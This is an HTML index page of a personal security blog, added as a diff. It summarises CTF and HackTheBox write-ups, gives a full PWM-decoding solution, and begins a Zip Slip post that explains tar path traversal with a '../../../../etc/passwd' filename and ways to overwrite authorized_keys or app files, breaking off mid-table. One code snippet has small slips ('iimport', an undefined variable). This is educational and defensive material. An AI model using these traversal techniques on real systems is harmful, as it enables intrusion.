@@ -1,0 +1,538 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="description" content="Haicen's personal website">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>haicen.me</title>
+<link href="assets/css/all-nocdn.css" rel="stylesheet" type="text/css">
+<meta name="theme-color" content="#5670d4">
+<meta name="generator" content="Nikola (getnikola.com)">
+<link rel="alternate" type="application/rss+xml" title="RSS" hreflang="en" href="rss.xml">
+<link rel="canonical" href="https://blog.haicen.me/">
+<link rel="next" href="index-1.html" type="text/html">
+<!--[if lt IE 9]><script src="assets/js/html5.js"></script><![endif]--><link rel="prefetch" href="posts/fun-with-guids/" type="text/html">
+</head>
+<body>
+<a href="#content" class="sr-only sr-only-focusable">Skip to main content</a>
+
+<!-- Menubar -->
+
+<nav class="navbar navbar-inverse navbar-static-top"><div class="container">
+<!-- This keeps the margins nice -->
+        <div class="navbar-header">
+            <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-navbar" aria-controls="bs-navbar" aria-expanded="false">
+            <span class="sr-only">Toggle navigation</span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="https://blog.haicen.me/">
+
+                <span id="blog-title">haicen.me</span>
+            </a>
+        </div>
+<!-- /.navbar-header -->
+        <div class="collapse navbar-collapse" id="bs-navbar" aria-expanded="false">
+            <ul class="nav navbar-nav">
+<li>
+<a href="archive.html">Archive</a>
+                </li>
+<li>
+<a href="categories/">Tags</a>
+                </li>
+<li>
+<a href="rss.xml">RSS feed</a>
+                </li>
+<li>
+<a href="pages/about-me">Contact Me</a>
+
+                
+            </li>
+</ul>
+<ul class="nav navbar-nav navbar-right"></ul>
+</div>
+<!-- /.navbar-collapse -->
+    </div>
+<!-- /.container -->
+</nav><!-- End of Menubar --><div class="container" id="content" role="main">
+    <div class="body-content">
+        <!--Body content-->
+        <div class="row">
+            
+            
+
+    
+
+
+    
+<div class="postindex">
+    <article class="h-entry post-text" itemscope="itemscope" itemtype="http://schema.org/Article"><header><h1 class="p-name entry-title"><a href="posts/fun-with-guids/" class="u-url">Fun with GUID's</a></h1>
+        <div class="metadata">
+            <p class="byline author vcard"><span class="byline-name fn" itemprop="author">
+                Haicen
+            </span></p>
+            <p class="dateline">
+            <a href="posts/fun-with-guids/" rel="bookmark">
+            <time class="published dt-published" datetime="2022-10-21T22:42:13-04:00" itemprop="datePublished" title="2022-10-21 22:42">2022-10-21 22:42</time></a>
+            </p>
+        </div>
+    </header><div class="p-summary entry-summary">
+    <div>
+<p>Recently, Intigrity (<a class="reference external" href="https://twitter.com/intigriti">https://twitter.com/intigriti</a>) posted a challenge on Twitter.
+I found this challenge to be pretty interesting, as I had not really heard of any issues regarding GUIDs (Global Unique IDentifier), sometimes also listed as UUID (Universally unique identifier).
+These are all what I had previously assumed were essentially random and non-predictable.
+Unfortunately, some versions of the UUID are not so random, at least for UUIDv1.</p>
+<figure><img alt="/images/fun-with-guids/homepage.png" src="images/fun-with-guids/homepage.png"></figure><p>The rest of the post continues after the break.</p>
+<p class="more"><a href="posts/fun-with-guids/">Read more…</a></p>
+</div>
+    </div>
+    </article><article class="h-entry post-text" itemscope="itemscope" itemtype="http://schema.org/Article"><header><h1 class="p-name entry-title"><a href="posts/hackthebox-search/" class="u-url">HackTheBox - Search</a></h1>
+        <div class="metadata">
+            <p class="byline author vcard"><span class="byline-name fn" itemprop="author">
+                Haicen
+            </span></p>
+            <p class="dateline">
+            <a href="posts/hackthebox-search/" rel="bookmark">
+            <time class="published dt-published" datetime="2022-07-20T08:34:09-04:00" itemprop="datePublished" title="2022-07-20 08:34">2022-07-20 08:34</time></a>
+            </p>
+        </div>
+    </header><div class="p-summary entry-summary">
+    <section id="introduction"><h2>Introduction</h2>
+<p>Search is a retired HackTheBox machine which contains several common windows exploits.
+I completed this box a while ago, but it now that it has retired, I can post my writeup.
+Some of the tools used to complete this box are: crackmapexec, gmsadumper, bloodhound, smbclient, and rpcclient.</p>
+<p class="more"><a href="posts/hackthebox-search/">Read more…</a></p></section>
+</div>
+    </article><article class="h-entry post-text" itemscope="itemscope" itemtype="http://schema.org/Article"><header><h1 class="p-name entry-title"><a href="posts/configuring-custom-headers-for-owasp-zap/" class="u-url">Configuring custom headers for OWASP ZAP</a></h1>
+        <div class="metadata">
+            <p class="byline author vcard"><span class="byline-name fn" itemprop="author">
+                Haicen
+            </span></p>
+            <p class="dateline">
+            <a href="posts/configuring-custom-headers-for-owasp-zap/" rel="bookmark">
+            <time class="published dt-published" datetime="2022-06-18T08:47:43-04:00" itemprop="datePublished" title="2022-06-18 08:47">2022-06-18 08:47</time></a>
+            </p>
+        </div>
+    </header><div class="p-summary entry-summary">
+    <div>
+<p>I've been trying some bugbounty programs recently.
+I often alternate between using BurpSuite and ZAP.
+Many programs want you to add a custom header to your requests so the traffic can be identified, and in some cases, bypass some roadblocks.
+In this post, I'll show how to configure ZAP to add the custom header.</p>
+<img alt="/images/zap-header/teaser.png" src="images/zap-header/teaser.png"><p class="more"><a href="posts/configuring-custom-headers-for-owasp-zap/">Read more…</a></p>
+</div>
+    </div>
+    </article><article class="h-entry post-text" itemscope="itemscope" itemtype="http://schema.org/Article"><header><h1 class="p-name entry-title"><a href="posts/cyber-apocalypse-2022-space-pulses/" class="u-url">Cyber Apocalypse 2022 - Space Pulses</a></h1>
+        <div class="metadata">
+            <p class="byline author vcard"><span class="byline-name fn" itemprop="author">
+                Haicen
+            </span></p>
+            <p class="dateline">
+            <a href="posts/cyber-apocalypse-2022-space-pulses/" rel="bookmark">
+            <time class="published dt-published" datetime="2022-05-30T12:34:49-04:00" itemprop="datePublished" title="2022-05-30 12:34">2022-05-30 12:34</time></a>
+            </p>
+        </div>
+    </header><div class="p-summary entry-summary">
+    <p>This challenge was part of the hardware category, and was pretty interesting.
+Here is the challenge description:</p>
+<blockquote>
+<p>One of our enhanced radio telescopes captured some weird fluctuations from a nearby star. It was idle for decades due to the fact that it was fully enclosed by a Dyson Sphere but its patterns began to change drastically leading us to believe that someone is controlling part of the megastructure to release energy and send these pulses directed to us in order to transmit a message. They must have known that our equipment can read even the slightest fluctuations.</p>
+</blockquote>
+<p>There was a downloadable file, which was a saleae logic file.
+This definitely isn't something easy like serial.
+It seems like it might have some time dependent information encoded, because the pulse time is not consistent.
+I started to suspect this might be some sort of pulse width modulation encoding scheme.</p>
+<img alt="/images/space_pulses/initial.png" src="images/space_pulses/initial.png"><p>First, I exported the signal from Logic2 as a CSV so I could work with it.
+I started by plotting the time each pulse was on vs off.
+I knew the time was in seconds, so the pulse times would be small.</p>
+<div class="code"><pre class="code python"><a id="rest_code_aa8d1eb922484912a86e7b9ace733066-1" name="rest_code_aa8d1eb922484912a86e7b9ace733066-1" href="posts/cyber-apocalypse-2022-space-pulses/#rest_code_aa8d1eb922484912a86e7b9ace733066-1"></a><span class="n">iimport</span> <span class="n">numpy</span> <span class="k">as</span> <span class="n">np</span>
+<a id="rest_code_aa8d1eb922484912a86e7b9ace733066-2" name="rest_code_aa8d1eb922484912a86e7b9ace733066-2" href="posts/cyber-apocalypse-2022-space-pulses/#rest_code_aa8d1eb922484912a86e7b9ace733066-2"></a><span class="kn">from</span> <span class="nn">matplotlib</span> <span class="kn">import</span> <span class="n">pyplot</span> <span class="k">as</span> <span class="n">plt</span>
+<a id="rest_code_aa8d1eb922484912a86e7b9ace733066-3" name="rest_code_aa8d1eb922484912a86e7b9ace733066-3" href="posts/cyber-apocalypse-2022-space-pulses/#rest_code_aa8d1eb922484912a86e7b9ace733066-3"></a>
+<a id="rest_code_aa8d1eb922484912a86e7b9ace733066-4" name="rest_code_aa8d1eb922484912a86e7b9ace733066-4" href="posts/cyber-apocalypse-2022-space-pulses/#rest_code_aa8d1eb922484912a86e7b9ace733066-4"></a><span class="n">sig</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">genfromtxt</span><span class="p">(</span><span class="s1">'sp_digital.txt'</span><span class="p">,</span> <span class="n">delimiter</span><span class="o">=</span><span class="s1">','</span><span class="p">,</span> <span class="n">skip_header</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
+<a id="rest_code_aa8d1eb922484912a86e7b9ace733066-5" name="rest_code_aa8d1eb922484912a86e7b9ace733066-5" href="posts/cyber-apocalypse-2022-space-pulses/#rest_code_aa8d1eb922484912a86e7b9ace733066-5"></a><span class="n">values</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">diff</span><span class="p">(</span><span class="n">sig</span><span class="p">[:,</span><span class="mi">0</span><span class="p">])</span><span class="o">*</span><span class="mi">1000</span>
+<a id="rest_code_aa8d1eb922484912a86e7b9ace733066-6" name="rest_code_aa8d1eb922484912a86e7b9ace733066-6" href="posts/cyber-apocalypse-2022-space-pulses/#rest_code_aa8d1eb922484912a86e7b9ace733066-6"></a>
+<a id="rest_code_aa8d1eb922484912a86e7b9ace733066-7" name="rest_code_aa8d1eb922484912a86e7b9ace733066-7" href="posts/cyber-apocalypse-2022-space-pulses/#rest_code_aa8d1eb922484912a86e7b9ace733066-7"></a><span class="n">plt</span><span class="o">.</span><span class="n">figure</span><span class="p">()</span>
+<a id="rest_code_aa8d1eb922484912a86e7b9ace733066-8" name="rest_code_aa8d1eb922484912a86e7b9ace733066-8" href="posts/cyber-apocalypse-2022-space-pulses/#rest_code_aa8d1eb922484912a86e7b9ace733066-8"></a><span class="n">plt</span><span class="o">.</span><span class="n">plot</span><span class="p">(</span><span class="n">values</span><span class="p">[</span><span class="mi">2</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
+<a id="rest_code_aa8d1eb922484912a86e7b9ace733066-9" name="rest_code_aa8d1eb922484912a86e7b9ace733066-9" href="posts/cyber-apocalypse-2022-space-pulses/#rest_code_aa8d1eb922484912a86e7b9ace733066-9"></a><span class="n">plt</span><span class="o">.</span><span class="n">savefig</span><span class="p">(</span><span class="s1">'signal_plot.png'</span><span class="p">)</span>
+<a id="rest_code_aa8d1eb922484912a86e7b9ace733066-10" name="rest_code_aa8d1eb922484912a86e7b9ace733066-10" href="posts/cyber-apocalypse-2022-space-pulses/#rest_code_aa8d1eb922484912a86e7b9ace733066-10"></a><span class="n">plt</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</pre></div>
+<p>That produced the following output:</p>
+<img alt="/images/space_pulses/signal_plot.png" src="images/space_pulses/signal_plot.png"><p>That pretty much confirmed my suspicions that this was PWM.
+The time delta does not exceed 255 for any pulse, so that seems like it may be an ascii encoded string.
+Let's convert it.</p>
+<div class="code"><pre class="code python"><a id="rest_code_cf23cc74d10145f4b4d052d7630a2205-1" name="rest_code_cf23cc74d10145f4b4d052d7630a2205-1" href="posts/cyber-apocalypse-2022-space-pulses/#rest_code_cf23cc74d10145f4b4d052d7630a2205-1"></a><span class="n">rounded_values</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">round</span><span class="p">(</span><span class="n">values</span><span class="p">[::</span><span class="mi">2</span><span class="p">])</span>
+<a id="rest_code_cf23cc74d10145f4b4d052d7630a2205-2" name="rest_code_cf23cc74d10145f4b4d052d7630a2205-2" href="posts/cyber-apocalypse-2022-space-pulses/#rest_code_cf23cc74d10145f4b4d052d7630a2205-2"></a><span class="n">floor_values</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">floor</span><span class="p">(</span><span class="n">values</span><span class="p">[::</span><span class="mi">2</span><span class="p">])</span>
+<a id="rest_code_cf23cc74d10145f4b4d052d7630a2205-3" name="rest_code_cf23cc74d10145f4b4d052d7630a2205-3" href="posts/cyber-apocalypse-2022-space-pulses/#rest_code_cf23cc74d10145f4b4d052d7630a2205-3"></a><span class="n">ceil_values</span> <span class="o">=</span> <span class="n">int_values</span> <span class="o">+</span> <span class="mi">1</span>
+<a id="rest_code_cf23cc74d10145f4b4d052d7630a2205-4" name="rest_code_cf23cc74d10145f4b4d052d7630a2205-4" href="posts/cyber-apocalypse-2022-space-pulses/#rest_code_cf23cc74d10145f4b4d052d7630a2205-4"></a>
+<a id="rest_code_cf23cc74d10145f4b4d052d7630a2205-5" name="rest_code_cf23cc74d10145f4b4d052d7630a2205-5" href="posts/cyber-apocalypse-2022-space-pulses/#rest_code_cf23cc74d10145f4b4d052d7630a2205-5"></a><span class="k">for</span> <span class="n">v</span> <span class="ow">in</span> <span class="p">[</span><span class="n">rounded_values</span><span class="p">,</span> <span class="n">floor_values</span><span class="p">,</span> <span class="n">ceil_values</span><span class="p">]:</span>
+<a id="rest_code_cf23cc74d10145f4b4d052d7630a2205-6" name="rest_code_cf23cc74d10145f4b4d052d7630a2205-6" href="posts/cyber-apocalypse-2022-space-pulses/#rest_code_cf23cc74d10145f4b4d052d7630a2205-6"></a>    <span class="nb">print</span><span class="p">(</span><span class="s1">''</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">x</span><span class="p">))</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">v</span><span class="p">[</span><span class="mi">1</span><span class="p">:]]))</span>
+</pre></div>
+<p>I did not know whether my floating point values from the time delta should be rounded, floored, or ceiling-ed, so I did all 3.
+My script output the following:</p>
+<pre class="literal-block">Dppsejobuft!.!SB!2:i!69n!33t!}!Efd!,46+!23(!7((!.!Wbmjebujpo!tfdsfu!dpef;!IUC|qv2646`n1ev2582o:`2o`6q5d4"63&amp;~
+Coordinates - RA 19h 58m 22s | Dec +35* 12' 6'' - Validation secret code: HTB{pu1535_m0du1471n9_1n_5p4c3!52%}
+Dppsejobuft!.!SB!2:i!69n!33t!}!Efd!,46+!23(!7((!.!Wbmjebujpo!tfdsfu!dpef;!IUC|qv2646`n1ev2582o:`2o`6q5d4"63&amp;~</pre>
+<p>The only one that produced reasonable output was floor. The flag is in the last half of the message.</p>
+<p>The full script is below:</p>
+<div class="code"><pre class="code python"><a id="rest_code_11434ad937fb41caaf38362cf6bd9ef8-1" name="rest_code_11434ad937fb41caaf38362cf6bd9ef8-1" href="posts/cyber-apocalypse-2022-space-pulses/#rest_code_11434ad937fb41caaf38362cf6bd9ef8-1"></a><span class="kn">import</span> <span class="nn">numpy</span> <span class="k">as</span> <span class="nn">np</span>
+<a id="rest_code_11434ad937fb41caaf38362cf6bd9ef8-2" name="rest_code_11434ad937fb41caaf38362cf6bd9ef8-2" href="posts/cyber-apocalypse-2022-space-pulses/#rest_code_11434ad937fb41caaf38362cf6bd9ef8-2"></a><span class="kn">from</span> <span class="nn">matplotlib</span> <span class="kn">import</span> <span class="n">pyplot</span> <span class="k">as</span> <span class="n">plt</span>
+<a id="rest_code_11434ad937fb41caaf38362cf6bd9ef8-3" name="rest_code_11434ad937fb41caaf38362cf6bd9ef8-3" href="posts/cyber-apocalypse-2022-space-pulses/#rest_code_11434ad937fb41caaf38362cf6bd9ef8-3"></a>
+<a id="rest_code_11434ad937fb41caaf38362cf6bd9ef8-4" name="rest_code_11434ad937fb41caaf38362cf6bd9ef8-4" href="posts/cyber-apocalypse-2022-space-pulses/#rest_code_11434ad937fb41caaf38362cf6bd9ef8-4"></a><span class="n">sig</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">genfromtxt</span><span class="p">(</span><span class="s1">'sp_digital.txt'</span><span class="p">,</span> <span class="n">delimiter</span><span class="o">=</span><span class="s1">','</span><span class="p">,</span> <span class="n">skip_header</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
+<a id="rest_code_11434ad937fb41caaf38362cf6bd9ef8-5" name="rest_code_11434ad937fb41caaf38362cf6bd9ef8-5" href="posts/cyber-apocalypse-2022-space-pulses/#rest_code_11434ad937fb41caaf38362cf6bd9ef8-5"></a><span class="n">values</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">diff</span><span class="p">(</span><span class="n">sig</span><span class="p">[:,</span><span class="mi">0</span><span class="p">])</span><span class="o">*</span><span class="mi">1000</span>
+<a id="rest_code_11434ad937fb41caaf38362cf6bd9ef8-6" name="rest_code_11434ad937fb41caaf38362cf6bd9ef8-6" href="posts/cyber-apocalypse-2022-space-pulses/#rest_code_11434ad937fb41caaf38362cf6bd9ef8-6"></a>
+<a id="rest_code_11434ad937fb41caaf38362cf6bd9ef8-7" name="rest_code_11434ad937fb41caaf38362cf6bd9ef8-7" href="posts/cyber-apocalypse-2022-space-pulses/#rest_code_11434ad937fb41caaf38362cf6bd9ef8-7"></a><span class="n">plt</span><span class="o">.</span><span class="n">figure</span><span class="p">()</span>
+<a id="rest_code_11434ad937fb41caaf38362cf6bd9ef8-8" name="rest_code_11434ad937fb41caaf38362cf6bd9ef8-8" href="posts/cyber-apocalypse-2022-space-pulses/#rest_code_11434ad937fb41caaf38362cf6bd9ef8-8"></a><span class="n">plt</span><span class="o">.</span><span class="n">plot</span><span class="p">(</span><span class="n">values</span><span class="p">[</span><span class="mi">2</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
+<a id="rest_code_11434ad937fb41caaf38362cf6bd9ef8-9" name="rest_code_11434ad937fb41caaf38362cf6bd9ef8-9" href="posts/cyber-apocalypse-2022-space-pulses/#rest_code_11434ad937fb41caaf38362cf6bd9ef8-9"></a><span class="n">plt</span><span class="o">.</span><span class="n">savefig</span><span class="p">(</span><span class="s1">'signal_plot.png'</span><span class="p">)</span>
+<a id="rest_code_11434ad937fb41caaf38362cf6bd9ef8-10" name="rest_code_11434ad937fb41caaf38362cf6bd9ef8-10" href="posts/cyber-apocalypse-2022-space-pulses/#rest_code_11434ad937fb41caaf38362cf6bd9ef8-10"></a><span class="n">plt</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+<a id="rest_code_11434ad937fb41caaf38362cf6bd9ef8-11" name="rest_code_11434ad937fb41caaf38362cf6bd9ef8-11" href="posts/cyber-apocalypse-2022-space-pulses/#rest_code_11434ad937fb41caaf38362cf6bd9ef8-11"></a>
+<a id="rest_code_11434ad937fb41caaf38362cf6bd9ef8-12" name="rest_code_11434ad937fb41caaf38362cf6bd9ef8-12" href="posts/cyber-apocalypse-2022-space-pulses/#rest_code_11434ad937fb41caaf38362cf6bd9ef8-12"></a><span class="n">rounded_values</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">round</span><span class="p">(</span><span class="n">values</span><span class="p">[::</span><span class="mi">2</span><span class="p">])</span>
+<a id="rest_code_11434ad937fb41caaf38362cf6bd9ef8-13" name="rest_code_11434ad937fb41caaf38362cf6bd9ef8-13" href="posts/cyber-apocalypse-2022-space-pulses/#rest_code_11434ad937fb41caaf38362cf6bd9ef8-13"></a><span class="n">int_values</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">floor</span><span class="p">(</span><span class="n">values</span><span class="p">[::</span><span class="mi">2</span><span class="p">])</span>
+<a id="rest_code_11434ad937fb41caaf38362cf6bd9ef8-14" name="rest_code_11434ad937fb41caaf38362cf6bd9ef8-14" href="posts/cyber-apocalypse-2022-space-pulses/#rest_code_11434ad937fb41caaf38362cf6bd9ef8-14"></a><span class="n">ceil_values</span> <span class="o">=</span> <span class="n">int_values</span> <span class="o">+</span> <span class="mi">1</span>
+<a id="rest_code_11434ad937fb41caaf38362cf6bd9ef8-15" name="rest_code_11434ad937fb41caaf38362cf6bd9ef8-15" href="posts/cyber-apocalypse-2022-space-pulses/#rest_code_11434ad937fb41caaf38362cf6bd9ef8-15"></a>
+<a id="rest_code_11434ad937fb41caaf38362cf6bd9ef8-16" name="rest_code_11434ad937fb41caaf38362cf6bd9ef8-16" href="posts/cyber-apocalypse-2022-space-pulses/#rest_code_11434ad937fb41caaf38362cf6bd9ef8-16"></a><span class="k">for</span> <span class="n">v</span> <span class="ow">in</span> <span class="p">[</span><span class="n">rounded_values</span><span class="p">,</span> <span class="n">int_values</span><span class="p">,</span> <span class="n">ceil_values</span><span class="p">]:</span>
+<a id="rest_code_11434ad937fb41caaf38362cf6bd9ef8-17" name="rest_code_11434ad937fb41caaf38362cf6bd9ef8-17" href="posts/cyber-apocalypse-2022-space-pulses/#rest_code_11434ad937fb41caaf38362cf6bd9ef8-17"></a>    <span class="nb">print</span><span class="p">(</span><span class="s1">''</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">x</span><span class="p">))</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">v</span><span class="p">[</span><span class="mi">1</span><span class="p">:]]))</span>
+</pre></div>
+    </div>
+    </article><article class="h-entry post-text" itemscope="itemscope" itemtype="http://schema.org/Article"><header><h1 class="p-name entry-title"><a href="posts/cyber-apocalypse-2022-blinkerfluids/" class="u-url">Cyber Apocalypse 2022 - Blinkerfluids</a></h1>
+        <div class="metadata">
+            <p class="byline author vcard"><span class="byline-name fn" itemprop="author">
+                Haicen
+            </span></p>
+            <p class="dateline">
+            <a href="posts/cyber-apocalypse-2022-blinkerfluids/" rel="bookmark">
+            <time class="published dt-published" datetime="2022-05-30T11:33:08-04:00" itemprop="datePublished" title="2022-05-30 11:33">2022-05-30 11:33</time></a>
+            </p>
+        </div>
+    </header><div class="p-summary entry-summary">
+    <div>
+<p>This was the first web challenge I solved in the Cyber Apocalypse 2022 CTF.
+This challenge had a downloadable portion with a fake flag as well as a web instance with an actual flag.
+Since the CTF has been over for a while and I didn't capture any of the actual challenge, I am recreating the steps I took here using the docker container.</p>
+<p class="more"><a href="posts/cyber-apocalypse-2022-blinkerfluids/">Read more…</a></p>
+</div>
+    </div>
+    </article><article class="h-entry post-text" itemscope="itemscope" itemtype="http://schema.org/Article"><header><h1 class="p-name entry-title"><a href="posts/dumping-chrome-passwords-using-pypykatz/" class="u-url">Dumping chrome passwords using pypykatz</a></h1>
+        <div class="metadata">
+            <p class="byline author vcard"><span class="byline-name fn" itemprop="author">
+                Haicen
+            </span></p>
+            <p class="dateline">
+            <a href="posts/dumping-chrome-passwords-using-pypykatz/" rel="bookmark">
+            <time class="published dt-published" datetime="2022-05-30T09:27:07-04:00" itemprop="datePublished" title="2022-05-30 09:27">2022-05-30 09:27</time></a>
+            </p>
+        </div>
+    </header><div class="p-summary entry-summary">
+    <div>
+<p>I recently competed in the Cyber Apocalypse 2022 CTF on Hackthebox.
+This was a really fun experience (and my first ever live CTF).
+I only solved a few challenges (which I'll be writing in subsequent posts), but there was one vexating challenge which I wasn't able to complete.
+I kinda had the right idea, but I was missing some key pieces of information.
+The point of this post is to explain what I was missing and how it works (and to document how I would have done it).</p>
+<p>This particular challenge was called "Siezed"</p>
+<p>The challenge description read</p>
+<blockquote>
+<p>Miyuki is now after a newly formed ransomware division which works for Longhir. This division's goal is to target any critical infrastructure and cause financial losses to their opponents. They never restore the encrypted files, even if the victim pays the ransom. This case is the number one priority for the team at the moment. Miyuki has seized the hard-drive of one of the members and it is believed that inside of which there may be credentials for the Ransomware's Dashboard. Given the AppData folder, can you retrieve the wanted credentials?</p>
+</blockquote>
+<p>A zip file was provided which contained the full AppData from a windows user.
+Based on the description, I felt like all I needed to do was search for and extract the browser's saved passwords.</p>
+<p class="more"><a href="posts/dumping-chrome-passwords-using-pypykatz/">Read more…</a></p>
+</div>
+    </div>
+    </article><article class="h-entry post-text" itemscope="itemscope" itemtype="http://schema.org/Article"><header><h1 class="p-name entry-title"><a href="posts/xss-ssti-in-flask/" class="u-url">XSS and SSTI in Flask</a></h1>
+        <div class="metadata">
+            <p class="byline author vcard"><span class="byline-name fn" itemprop="author">
+                Haicen
+            </span></p>
+            <p class="dateline">
+            <a href="posts/xss-ssti-in-flask/" rel="bookmark">
+            <time class="published dt-published" datetime="2022-02-15T21:40:41-05:00" itemprop="datePublished" title="2022-02-15 21:40">2022-02-15 21:40</time></a>
+            </p>
+        </div>
+    </header><div class="p-summary entry-summary">
+    <section id="introduction"><h2>Introduction</h2>
+<p>According to the project's home page,</p>
+<blockquote>
+<p>Flask is a lightweight WSGI web application framework. It is designed to make getting started quick and easy, with the ability to scale up to complex applications. It began as a simple wrapper around Werkzeug and Jinja and has become one of the most popular Python web application frameworks.</p>
+</blockquote>
+<p>Django sits at the other end of the python web service spectrum.
+Each has their own advantages and disadvantages.
+If I had to pick a downside for Flask, it is that can be easy to introduce unintentional vulnerabilities.
+This is <strong>not</strong> a problem with Flask itself, but is a result of improper sanitizing of user input.</p>
+<p>This blog post will explore two vulnerabilities in an intentionally vulnerable flask app.</p>
+<p class="more"><a href="posts/xss-ssti-in-flask/">Read more…</a></p></section>
+</div>
+    </article><article class="h-entry post-text" itemscope="itemscope" itemtype="http://schema.org/Article"><header><h1 class="p-name entry-title"><a href="posts/confusing-script-kiddies-with-random-default-server-pages/" class="u-url">Confusing script kiddies with random default server pages</a></h1>
+        <div class="metadata">
+            <p class="byline author vcard"><span class="byline-name fn" itemprop="author">
+                Haicen
+            </span></p>
+            <p class="dateline">
+            <a href="posts/confusing-script-kiddies-with-random-default-server-pages/" rel="bookmark">
+            <time class="published dt-published" datetime="2022-01-08T17:58:02-05:00" itemprop="datePublished" title="2022-01-08 17:58">2022-01-08 17:58</time></a>
+            </p>
+        </div>
+    </header><div class="p-summary entry-summary">
+    <p>Anyone who runs a server connected to the internet can tell you that they get hammered all day every day by bots.
+Sometimes, a human is poking at things looking for vulnerable applications.
+Quite a while ago, I created a simple php script to randomly pretend to be one of the 3 web servers (Apache, Nginx, IIS).</p>
+<p>Due to copyright, I am not sharing the source code from the html page for IIS.
+They are pretty easy to find without downloading/installing the package.
+The NGINX source is available on <a class="reference external" href="https://github.com/nginx/nginx/blob/master/docs/html/index.html">Github</a>
+I tried to find the one served by Apache2, but could not find the page I wanted.
+Fortunately, it happened to be available on one of my other servers so I just copied it over from there.</p>
+<p>The php script is included below:</p>
+<script src="https://gist.github.com/49e8cca8f0a81c68c8f62e33a8d29d33.js"></script><noscript>
+<pre class="literal-block">&lt;?php
+// I'm not providing the iis_index.html file, but savvy users can figure out how to get a copy.
+// the other two are just the default pages you can find in either projects public code.
+// use case: confusing skids
+
+$i = rand(0, 2);
+switch ($i)
+{
+case 0:
+        //echo "nginx";
+        include "nginx.html";
+        break;
+case 1:
+        //echo "apache";
+        include "apache_index.html";
+        break;
+case 2:
+        //echo "IIS";
+        include "iis_index.html";
+        break;
+}
+?&gt;</pre>
+</noscript>
+    </div>
+    </article><article class="h-entry post-text" itemscope="itemscope" itemtype="http://schema.org/Article"><header><h1 class="p-name entry-title"><a href="posts/zip-slip-malicious-archives/" class="u-url">Zip Slip (malicious archives)</a></h1>
+        <div class="metadata">
+            <p class="byline author vcard"><span class="byline-name fn" itemprop="author">
+                Haicen
+            </span></p>
+            <p class="dateline">
+            <a href="posts/zip-slip-malicious-archives/" rel="bookmark">
+            <time class="published dt-published" datetime="2021-12-04T17:41:43-05:00" itemprop="datePublished" title="2021-12-04 17:41">2021-12-04 17:41</time></a>
+            </p>
+        </div>
+    </header><div class="p-summary entry-summary">
+    <p>Recently, I completed a CTF challenge that involved an interesting vulnerability.
+Since the challenge is active, I won't be providing screenshots, but I've kept things general enough that it shouldn't spoil anything.</p>
+<section id="the-web-app"><h2>The web app</h2>
+<p>The entire app was provided with a dockerfile, so it could be run offline.</p>
+<p>My first step was to investigate the app and see what vulnerabilities might exist.
+The web app is very simple, and was developed using Flask.
+It contains a single web page that allows you to upload a tar.gz file.
+The uploaded file is extracted using the <a class="reference external" href="https://docs.python.org/3/library/tarfile.html">tarfile</a> library.
+The validation of user uploaded file is insufficient.</p>
+<p>First, the file is checked to see if it is indeed a tarfile, with a call to <code class="docutils literal">tarfile.is_tarfile()</code>.
+If this is true, then <cite>tarfile.extract_all()</cite> is called. There is a warning about this function in the docs.</p>
+<p>Warning</p>
+<p><code class="docutils literal">Never extract archives from untrusted sources without prior inspection. It is possible that files are created outside of path, e.g. members that have absolute filenames starting with "/" or filenames with two dots <span class="pre">"..".</span></code></p>
+</section><section id="the-vulnerability"><h2>The vulnerability</h2>
+<p>Some further research reveals that this is quite an old vulnerability.
+The tar program was discovered to be vulnerable all the way back in 2001, <a class="reference external" href="https://nvd.nist.gov/vuln/detail/CVE-2001-1267">CVE-2001-1267</a>
+The core issue is that tar did not validate filenames, so if the archive contained a file named <code class="docutils literal"><span class="pre">../../../../etc/passwd</span></code>, when extracted it would overwrite <code class="docutils literal">/etc/passwd</code> by traversing the <code class="docutils literal">../</code> directives as long the user invoking tar had the appropriate permissions)</p>
+<p>The python tarfile module apparently shares a great deal of similar code, because the same issue was identified in the python module in 2007 (6 years after the original tar vulnerability).
+This was discussed on the python-dev email list <a class="reference external" href="https://mail.python.org/pipermail/python-dev/2007-August/074290.html">https://mail.python.org/pipermail/python-dev/2007-August/074290.html</a>
+It was again discussed in 2014, <a class="reference external" href="https://bugs.python.org/issue21109">https://bugs.python.org/issue21109</a>
+Now, 20 years later, there still isn't a resolution.</p>
+<p>In the general sense, I see two potential ways of exploiting a vulnerability like this.
+In modern linux environments, /etc/passwd no longer contains sensitive information like password hashes, so overwriting that file won't allow access to the machine.
+One potential attack would be to overwrite the users <code class="docutils literal"><span class="pre">~/.ssh/authorized_keys</span></code> file to include your own key.
+Of course, for that to be exploitable, you would already need access to the file system.</p>
+<p>Since python is now popular for developing web apps through Django and Flask, this opens up a new avenue: uploading a malicious archive to overwrite or create files.</p>
+<p>Back to the challenge, since the app is flask, it is possible to overwrite the main app handler.</p>
+<p>The original file is quite simple</p>
+<div class="code"><table class="codetable">
+<tr>
